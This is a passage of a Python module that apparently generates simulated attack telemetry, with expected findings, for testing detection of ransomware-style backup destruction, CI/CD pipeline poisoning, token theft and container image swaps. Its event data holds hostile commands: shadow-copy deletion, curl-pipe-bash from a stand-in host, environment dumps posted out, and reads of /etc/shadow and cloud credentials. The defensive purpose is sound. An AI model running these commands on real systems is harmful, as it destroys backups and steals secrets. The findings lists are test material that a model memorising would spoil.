        # =====================================================================

        # --- Phase 5: Attacker returns ---
        AttackEvent(event_type="login", delay=_delay(600, 180, 360, 960), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "return_session": True, "off_hours": True}}, requires_success=False),

        # --- Phase 6: Destroy local backups ---
        # Delete all VSS shadow copies
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "vssadmin.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "vssadmin delete shadows /all /quiet", "path": "C:\\Windows\\System32\\vssadmin.exe", "pid": 6240, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        # Disable Windows recovery
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "bcdedit.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "bcdedit /set {default} recoveryenabled No", "path": "C:\\Windows\\System32\\bcdedit.exe", "pid": 6268, "integrity_level": "high", "hash": "c3d4e5f6a7b8901234567890abcdef2345678901abcdef2345678901abcdef23", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        # Stop and disable Windows Backup Engine
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "sc.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "sc stop wbengine && sc config wbengine start=disabled", "path": "C:\\Windows\\System32\\sc.exe", "pid": 6296, "integrity_level": "high", "hash": "b2c3d4e5f6a7890123456789abcdef1234567890abcdef1234567890abcdef12", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Destroy Veeam backups ---
        # Stop Veeam services first
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "sc.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "sc stop VeeamBackupSvc && sc stop VeeamCloudSvc", "path": "C:\\Windows\\System32\\sc.exe", "pid": 6340, "integrity_level": "high", "hash": "b2c3d4e5f6a7890123456789abcdef1234567890abcdef1234567890abcdef12", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Veeam Backup & Replication", "action": "delete_backup_catalog", "resource_type": "backup_catalog", "resource_name": "backup_catalog_all", "success": True, "description": "Veeam backup catalog deleted — all job history and metadata destroyed", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Veeam Backup & Replication", "action": "delete_backup_files", "resource_type": "backup_files", "resource_name": "\\\\NAS01\\VeeamBackup\\*", "success": True, "description": "Veeam backup files deleted from local NAS repository", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Destroy cloud backups ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "AWS Backup", "action": "delete_recovery_points", "resource_type": "recovery_point", "resource_name": "production_backup_vault — all 14 recovery points", "success": True, "description": "All recovery points deleted from production backup vault", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS Backup", "action": "delete_backup_vault", "resource_type": "backup_vault", "resource_name": "production_backup_vault", "success": True, "description": "Production backup vault deleted", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS Backup", "action": "delete_backup_vault", "resource_type": "backup_vault", "resource_name": "dr_backup_vault", "success": True, "description": "Disaster recovery backup vault deleted", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: Deploy destructive payload ---
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 25), data={"process_name": "wiper.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "C:\\Windows\\Temp\\wiper.exe --silent --all-drives", "path": "C:\\Windows\\Temp\\wiper.exe", "pid": 6520, "integrity_level": "system", "hash": "d4e5f6a7b8c9012345678901abcdef3456789012abcdef3456789012abcdef34", "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "impact", "is_attacker": True, "destructive_payload": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.6,
    iocs=[],
    expected_findings=[
        "Full backup infrastructure enumerated (VSS, Veeam, AWS)",
        "VSS shadow copies deleted",
        "Veeam services stopped and backups destroyed",
        "AWS backup vaults and recovery points deleted",
        "Wiper deployed after backup removal — no recovery possible",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

POISONED_PIPELINE = AttackScenario(
    id="poisoned_pipeline",
    tier="T2",
    name="Poisoned CI/CD Pipeline via Malicious PR",
    description="Attacker creates a PR with a modified CI/CD workflow file, bypasses review by self-approving, triggers the pipeline which dumps CI environment variables, accesses multiple secrets, tampers with artifact integrity, publishes a backdoored artifact, and triggers a deployment.",
    attack_type="supply_chain",
    events=[
        # --- Phase 1: PR creation ---
        AttackEvent(event_type="app_event", delay=_delay(0, 0), data={"app": "GitHub Actions", "action": "create_pull_request", "resource_name": "core-platform", "success": True, "description": "PR submitted modifying .github/workflows/build.yml", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # --- Phase 2: Reviewer bypass ---
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 3), data={"app": "GitHub Actions", "action": "approve_pull_request", "resource_name": "core-platform PR #847", "success": True, "description": "PR self-approved exploiting lax branch protection", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 3), data={"app": "GitHub Actions", "action": "merge_pull_request", "resource_name": "core-platform PR #847", "success": True, "description": "Malicious PR merged to main branch", "metadata": {"attack_phase": "execution", "is_attacker": True}}, requires_success=True),
        # --- Phase 3: Pipeline triggered ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 5), data={"app": "GitHub Actions", "action": "trigger_pipeline", "resource_name": "core-platform/pipeline", "success": True, "description": "CI pipeline triggered on merge to main", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        # --- Phase 4: CI env dump ---
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "bash", "action": "start", "parent_process": "runner-agent", "command_line": "bash -c 'printenv | base64 > /tmp/env.b64'", "path": "/usr/bin/bash", "pid": 3841, "integrity_level": "medium", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "runner", "metadata": {"attack_phase": "credential_access", "env_dump": True}}, requires_success=True),
        # --- Phase 5: Remote payload ---
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "bash", "action": "start", "parent_process": "runner-agent", "command_line": "curl https://cdn-static-assets.com/stage2.sh | bash", "path": "/usr/bin/bash", "pid": 3842, "integrity_level": "medium", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "runner", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        # --- Phase 6: Multiple secret accesses ---
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 3), data={"app": "GitHub Actions", "action": "read_secret", "resource_name": "AWS_ACCESS_KEY_ID", "success": True, "description": "CI secret AWS_ACCESS_KEY_ID accessed", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"app": "GitHub Actions", "action": "read_secret", "resource_name": "NPM_AUTH_TOKEN", "success": True, "description": "CI secret NPM_AUTH_TOKEN accessed", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"app": "GitHub Actions", "action": "read_secret", "resource_name": "DEPLOY_KEY", "success": True, "description": "CI secret DEPLOY_KEY accessed", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        # --- Phase 7: Artifact integrity tampering ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 5), data={"app": "GitHub Actions", "action": "modify_artifact_checksum", "resource_name": "core-platform:latest SHA256", "success": True, "description": "Artifact checksum replaced to match backdoored build", "metadata": {"attack_phase": "impact", "is_attacker": True, "integrity_tampering": True}}, requires_success=True),
        # --- Phase 8: Publish backdoored artifact ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "npm registry", "action": "publish_artifact", "resource_name": "core-platform:latest", "success": True, "description": "Backdoored artifact published with stolen NPM_AUTH_TOKEN", "metadata": {"attack_phase": "impact", "is_attacker": True}}, requires_success=True),
        # --- Phase 9: Deployment trigger ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "GitHub Actions", "action": "trigger_deployment", "resource_name": "production-deploy", "success": True, "description": "Production deployment triggered with compromised artifact", "metadata": {"attack_phase": "impact", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.7,
    iocs=["cdn-static-assets.com"],
    expected_findings=["PR modifying CI workflow file self-approved", "CI env variables and secrets dumped", "Remote payload fetched via curl-pipe-bash", "Backdoored artifact published to production"],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

CICD_TOKEN_THEFT = AttackScenario(
    id="cicd_token_theft",
    tier="T2",
    name="CI/CD Token Theft for Multi-System Access",
    description="Malicious CI job dumps environment variables including cloud credentials and GitHub tokens, queries AWS Secrets Manager for production secrets, and exfiltrates everything to an attacker-controlled endpoint. Attacker later uses stolen tokens from a foreign IP to enumerate cloud resources, access production databases, and exfiltrate sensitive data.",
    attack_type="supply_chain",
    events=[
        # --- Phase 1: CI job triggered ---
        AttackEvent(event_type="app_event", delay=_delay(0, 0), data={"app": "GitHub Actions", "action": "start_job", "resource_type": "ci_job", "resource_name": "build-and-test", "success": True, "description": "CI build job started on pull request", "metadata": {"attack_phase": "initial_access"}}, requires_success=False),

        # --- Phase 2: Credential harvesting inside CI runner ---
        # Dump all environment variables (includes GITHUB_TOKEN, AWS keys, etc.)
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "bash", "action": "start", "parent_process": "runner-agent", "command_line": "bash -c 'printenv | base64 | curl -X POST https://cdn-static-assets.com/env -d @-'", "path": "/usr/bin/bash", "pid": 2841, "integrity_level": "medium", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "runner", "metadata": {"attack_phase": "credential_access", "env_dump": True}}, requires_success=True),
        # Query Secrets Manager for production secrets
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 3), data={"app": "AWS Secrets Manager", "action": "list_secrets", "resource_type": "secret", "resource_name": "production/*", "success": True, "description": "Secrets Manager queried from CI runner — listed all production secrets", "metadata": {"attack_phase": "credential_access"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"app": "AWS Secrets Manager", "action": "get_secret_value", "resource_type": "secret", "resource_id": "prod/database/admin", "resource_name": "prod/database/admin", "success": True, "description": "Production database admin credentials retrieved from Secrets Manager", "metadata": {"attack_phase": "credential_access", "secret_stolen": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"app": "AWS Secrets Manager", "action": "get_secret_value", "resource_type": "secret", "resource_id": "prod/api/service-key", "resource_name": "prod/api/service-key", "success": True, "description": "Production API service key retrieved from Secrets Manager", "metadata": {"attack_phase": "credential_access", "secret_stolen": True}}, requires_success=True),
        # Exfil stolen secrets to attacker C2
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "runner", "auth": "none", "bytes_sent": 32768, "bytes_received": 256, "description": "HTTPS POST to external IP from CI runner — stolen secrets exfiltrated"}, requires_success=True),

        # --- Phase 3: Attacker uses stolen tokens (~1-2h later) ---
        AttackEvent(event_type="login", delay=_delay(90, 45, 20, 240), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "aws-cli/2.13.0 Python/3.11", "method": "service_token", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "stolen_token_reuse": True}}, requires_success=True),

        # --- Phase 4: Cloud enumeration with stolen credentials ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "AWS IAM", "action": "get_caller_identity", "resource_type": "identity", "resource_name": "ci-deploy-role", "success": True, "description": "Attacker verified identity of stolen token — ci-deploy-role with production access", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "AWS EC2", "action": "describe_instances", "resource_type": "instance", "resource_name": "All Instances", "success": True, "description": "Enumerated all EC2 instances — identified production database and API servers", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS S3", "action": "list_buckets", "resource_type": "bucket", "resource_name": "All Buckets", "success": True, "description": "Listed all S3 buckets — found prod-data-exports and customer-backups", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Access production resources ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "AWS RDS", "action": "connect", "resource_type": "database", "resource_id": "prod-db-primary", "resource_name": "prod-db-primary.cluster-abc123.us-east-1.rds.amazonaws.com", "success": True, "description": "Connected to production RDS instance using stolen database credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "AWS RDS", "action": "query_execute", "resource_type": "database", "resource_id": "prod-db-primary", "resource_name": "SELECT * FROM users LIMIT 50000", "success": True, "description": "Bulk query executed against production users table — 50,000 rows exported", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS S3", "action": "get_object", "resource_type": "object", "resource_id": "s3://prod-data-exports/customer-pii-2026.csv.gz", "resource_name": "customer-pii-2026.csv.gz", "success": True, "description": "Downloaded customer PII export from S3 production bucket", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Exfiltration ---
        AttackEvent(event_type="network_event", delay=_delay(10, 5, 2, 25), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "ci-deploy-role", "auth": "none", "bytes_sent": 104857600, "bytes_received": 2048, "description": "Large outbound data transfer — 100 MB of production data exfiltrated via stolen CI credentials"}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.65,
    iocs=["cdn-static-assets.com"],
    expected_findings=[
        "CI job dumped environment variables and exfiltrated to external endpoint",
        "Production secrets retrieved from CI runner",
        "Cloud login with stolen service token from foreign IP",
        "Production database and S3 data accessed via stolen CI credentials",
    ],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

MALICIOUS_CONTAINER_IMAGE = AttackScenario(
    id="malicious_container_image",
    tier="T2",
    name="Malicious Container Image Swap",
    description="Attacker with compromised registry credentials enumerates repositories, inspects image tags and digests, pushes a malicious image overwriting a legitimate tag, waits for Kubernetes to pull it, executes commands inside the container, accesses host filesystem, steals service account tokens, and establishes C2.",
    attack_type="supply_chain",
    events=[
        # --- Phase 1: Registry login ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "docker/24.0.6", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # --- Phase 2: Registry enumeration ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Container Registry", "action": "list_repositories", "resource_name": "All Repositories", "success": True, "description": "Enumerated container repositories — nginx, api-gateway, worker-service", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 3: Image tag inspection ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 5), data={"app": "Container Registry", "action": "list_tags", "resource_name": "nginx", "success": True, "description": "Listed tags for nginx — latest, v1.25.3, v1.24.0", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 3), data={"app": "Container Registry", "action": "get_manifest", "resource_name": "nginx:latest", "success": True, "description": "Retrieved manifest for nginx:latest — sha256:abc123 (original)", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # --- Phase 4: Push malicious image ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Container Registry", "action": "push_image", "resource_name": "nginx:latest", "success": True, "description": "Backdoored image pushed overwriting nginx:latest — new digest sha256:def456", "metadata": {"attack_phase": "persistence", "is_attacker": True, "digest_changed": True}}, requires_success=True),
        # --- Phase 5: Kubernetes pulls image ---
        AttackEvent(event_type="app_event", delay=_delay(60, 30, 10, 480), data={"app": "Kubernetes", "action": "pull_image", "resource_name": "nginx:latest (sha256:def456)", "success": True, "description": "Kubernetes pulled image with unexpected digest", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        # --- Phase 6: Container startup ---
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "container_entrypoint.sh", "action": "start", "parent_process": "containerd-shim", "command_line": "/bin/sh -c 'curl -sS https://cdn-static-assets.com/implant | bash &'", "path": "/entrypoint.sh", "pid": 1, "integrity_level": "high", "hash": "d4e5f6a7b8c9012345678901abcdef3456789012abcdef3456789012abcdef34", "user_context": "root", "metadata": {"attack_phase": "execution", "is_attacker": True}}, requires_success=True),
        # --- Phase 7: Host file access ---
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "cat", "action": "start", "parent_process": "sh", "command_line": "cat /host/etc/shadow", "path": "/usr/bin/cat", "pid": 42, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "root", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "container_escape_attempt": True}}, requires_success=True),
        # --- Phase 8: Service account token theft ---
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "cat", "action": "start", "parent_process": "sh", "command_line": "cat /var/run/secrets/kubernetes.io/serviceaccount/token", "path": "/usr/bin/cat", "pid": 43, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "root", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "sa_token_theft": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Kubernetes API", "action": "list_secrets", "resource_name": "default namespace secrets", "success": True, "description": "Used stolen SA token to list Kubernetes secrets", "metadata": {"attack_phase": "credential_access", "is_attacker": True}}, requires_success=True),
        # --- Phase 9: IMDS credential query ---
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "curl", "action": "start", "parent_process": "sh", "command_line": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/", "path": "/usr/bin/curl", "pid": 44, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "root", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "imds_query": True}}, requires_success=True),
        # --- Phase 10: C2 beacon ---
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "bytes_sent": 4096, "bytes_received": 16384, "description": "C2 beacon from container — exfiltrating SA tokens and host credentials", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True, "is_attacker": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.7,
    iocs=["cdn-static-assets.com"],
    expected_findings=["Image pushed overwriting tag with different digest", "Container executing curl-pipe-bash payload", "Service account token stolen via host filesystem access", "Kubernetes API accessed with stolen SA token"],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

WIPER_DISGUISED_AS_MAINTENANCE = AttackScenario(
    id="wiper_disguised_as_maintenance",
    tier="T3",
    name="Wiper Payload Disguised as Scheduled Maintenance",
    description="Attacker with compromised admin credentials performs infrastructure reconnaissance over multiple days, enumerating servers via Active Directory, listing databases, and mapping backup systems. Creates a legitimate-looking ServiceNow change ticket for cover. Returns to deploy maintenance scripts to target servers, disables monitoring alerts, and then executes a wiper payload on three critical systems during the approved maintenance window, causing cascading service failures and backup deletion.",
    attack_type="destruction",
    events=[
        # =====================================================================
        # DAY 1 — Initial access, infrastructure recon, create change ticket
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Infrastructure reconnaissance ---
        # Enumerate servers via AD
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem | Select Name,OperatingSystem\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 4320, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # List databases on SQL server
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "SQL Server Management Studio", "action": "query_execute", "resource_type": "database", "resource_name": "master", "success": True, "description": "Enumerated all databases on SRV-SQL01 — 8 databases including CRM, ERP, HR_Records", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # Enumerate backup systems
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Get-WmiObject Win32_ShadowCopy | Select DeviceObject,InstallDate; Get-Service wbengine,VeeamBackupSvc | Select Name,Status\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 4388, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Veeam Backup & Replication", "action": "list_backup_jobs", "resource_type": "backup_job", "resource_name": "All Backup Jobs", "success": True, "description": "Enumerated Veeam backup jobs — identified daily, weekly, and offsite backup schedules", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Create ServiceNow change ticket for cover ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 45), data={"app": "ServiceNow", "action": "create_ticket", "resource_type": "change_request", "resource_id": "CHG0012345", "resource_name": "CHG0012345 — Quarterly Database Maintenance and Log Cleanup", "success": True, "description": "Change ticket created: 'Quarterly Database Maintenance and Log Cleanup' — scheduled for maintenance window Saturday 02:00-06:00", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "maintenance_cover": True}}, requires_success=True),

        # =====================================================================
        # DAY 2 — Return, deploy scripts, disable monitoring, test connectivity
        # (overnight gap: attacker preps wiper scripts)
        # =====================================================================

        # --- Phase 4: Attacker returns ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "execution", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 5: Deploy scripts to target servers ---
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 25), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Copy-Item C:\\Users\\Public\\maintenance.ps1 \\\\SRV-SQL01\\C$\\Windows\\Temp\\ -Force\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 5104, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "execution", "is_attacker": True, "target": "SRV-SQL01"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Copy-Item C:\\Users\\Public\\maintenance.ps1 \\\\SRV-APP01\\C$\\Windows\\Temp\\ -Force\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 5140, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "execution", "is_attacker": True, "target": "SRV-APP01"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Copy-Item C:\\Users\\Public\\maintenance.ps1 \\\\SRV-FILE01\\C$\\Windows\\Temp\\ -Force\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 5172, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "execution", "is_attacker": True, "target": "SRV-FILE01"}}, requires_success=True),

        # --- Phase 6: Disable monitoring alerts ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Datadog", "action": "mute_monitor", "resource_type": "monitor", "resource_name": "SRV-SQL01 Service Health", "success": True, "description": "Muted monitoring alerts for SRV-SQL01 — reason: scheduled maintenance CHG0012345", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Datadog", "action": "mute_monitor", "resource_type": "monitor", "resource_name": "SRV-APP01 Service Health", "success": True, "description": "Muted monitoring alerts for SRV-APP01 — reason: scheduled maintenance CHG0012345", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Datadog", "action": "mute_monitor", "resource_type": "monitor", "resource_name": "SRV-FILE01 Service Health", "success": True, "description": "Muted monitoring alerts for SRV-FILE01 — reason: scheduled maintenance CHG0012345", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # Test connectivity to confirm scripts are in place
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "PowerShell.exe -Command \"Test-Path \\\\SRV-SQL01\\C$\\Windows\\Temp\\maintenance.ps1; Test-Path \\\\SRV-APP01\\C$\\Windows\\Temp\\maintenance.ps1; Test-Path \\\\SRV-FILE01\\C$\\Windows\\Temp\\maintenance.ps1\"", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 5220, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "execution", "is_attacker": True, "connectivity_test": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Return during maintenance window, execute wiper, service failures
        # (overnight gap: waits for approved maintenance window)
        # =====================================================================

        # --- Phase 7: Attacker returns during maintenance window ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "impact", "is_attacker": True, "return_session": True, "maintenance_window": True}}, requires_success=False),

        # --- Phase 8: Execute wiper on 3 target systems ---
        # Wiper on SRV-SQL01
